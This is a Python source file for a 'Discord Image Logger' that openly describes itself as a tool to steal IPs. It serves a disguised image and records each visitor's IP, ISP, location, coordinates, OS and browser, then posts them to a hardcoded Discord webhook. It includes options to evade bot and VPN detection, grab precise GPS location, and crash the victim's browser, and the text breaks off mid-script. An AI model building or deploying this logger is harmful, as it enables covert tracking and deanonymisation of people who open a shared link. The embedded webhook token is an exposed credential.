# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1344164528652550195/mwaR4J5i5jtV7uIhZ7oP_chglTkKXRLURAqi049SLZImB1UMtdERSGQej7Z5yNJWW5He",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
